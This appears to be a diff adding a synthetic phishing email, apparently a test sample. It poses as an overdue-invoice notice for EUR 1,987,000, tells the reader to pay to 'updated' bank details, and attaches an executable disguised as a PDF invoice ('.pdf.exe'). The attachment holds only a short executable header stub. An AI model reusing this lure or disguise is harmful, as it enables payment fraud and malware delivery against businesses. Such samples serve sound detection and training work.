@@ -1,0 +1,80 @@
+From: "Zenith Traders Accounts" <billing@incometax-refund-in.top>
+To: Rahul Pillai <rahul.pillai@vertexlogistics.in>
+Subject: Purchase order INV-2026-6099 needs your approval
+Date: Thu, 21 May 2026 21:17:00 +0000
+Message-ID: <178772093977.6.2380562161719577150@incometax-refund-in.top>
+Return-Path: <bounce-3386@incometax-refund-in.top>
+MIME-Version: 1.0
+X-Mailer: BulkSend 2.1
+Received: from mx1.mail-relay.example (mx1.mail-relay.example [192.0.2.10]) by
+ mx.vertexlogistics.in (Postfix) with ESMTPS id C13EB9E87D9F for
+ <recipient@vertexlogistics.in>; Thu, 21 May 2026 21:17:00 +0000
+Received: from smtp-out-3.example (smtp-out-3.example [192.0.2.44]) by
+ mx1.mail-relay.example (Postfix) with ESMTPS id F9B57552B8D2; Thu, 21 May
+ 2026 21:14:18 +0000
+Received: from compute-04.cloudprovider.example
+ (compute-04.cloudprovider.example [198.51.100.150]) by smtp-out-3.example
+ (Postfix) with ESMTPS id ED7AD0743304; Thu, 21 May 2026 21:13:13 +0000
+Received: from tor-exit-node.example (tor-exit-node.example [192.0.2.201]) by
+ compute-04.cloudprovider.example (Postfix) with ESMTPS id 65500FEBEA55; Thu,
+ 21 May 2026 21:09:47 +0000
+Received-SPF: softfail (mailfrom) identity=mailfrom; client-ip=203.0.113.61;
+ envelope-from=<bounce@incometax-refund-in.top>;
+Authentication-Results: mx.incometax-refund-in.top; spf=softfail
+ smtp.mailfrom=incometax-refund-in.top; dkim=fail
+ header.d=incometax-refund-in.top; dmarc=fail (p=reject)
+ header.from=incometax-refund-in.top
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=incometax-refund-in.top; s=selector1; t=566802983; h=from:to:subject:date;
+ bh=q7tsch/cNvCadpc4kgkUf7qKsXQMEdDxZDBYOHS5LE8=; =?utf-8?q?b=3DBcaRKCTs5biP?=
+ =?utf-8?q?YkQcQ1eetJTIvYmF/sdB7qMusehpfNyzxW4P06TO/sVxcA3EfSnpXN7LROuFtsIXz?=
+ =?utf-8?q?uDINDzrEw=3D=3D?=
+Content-Type: multipart/mixed; boundary="===============6219819279793424649=="
+
+--===============6219819279793424649==
+Content-Type: multipart/alternative;
+ boundary="===============7844057744694187879=="
+
+--===============7844057744694187879==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello Rahul,
+
+Please find attached invoice INV-2026-6099 for EUR 1,987,000, now overdue. Ki=
+ndly
+review the attached statement and process this payment immediately to avoid
+service interruption.
+
+If the bank details have changed since your last remittance, use the updated
+account information in the attachment.
+
+Regards,
+Rahul Joshi
+Accounts Receivable, Zenith Traders
+
+--===============7844057744694187879==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<html><body style=3D"font-family:Segoe UI,Arial,sans-serif;font-size:14px;col=
+or:#202124"><p>Hello Rahul,</p><p>Please find attached invoice INV-2026-6099 =
+for EUR 1,987,000, now overdue. Kindly review the attached statement and proc=
+ess this payment immediately to avoid service interruption.</p><p>If the bank=
+ details have changed since your last remittance, use the updated account inf=
+ormation in the attachment.</p><p>Regards, Rahul Joshi Accounts Receivable, Z=
+enith Traders</p></body></html>
+
+--===============7844057744694187879==--
+
+--===============6219819279793424649==
+Content-Type: application/octet-stream
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="INV-2026-6099.pdf.exe"
+MIME-Version: 1.0
+
+TVqQAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFRo
+aXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl
+
+--===============6219819279793424649==--
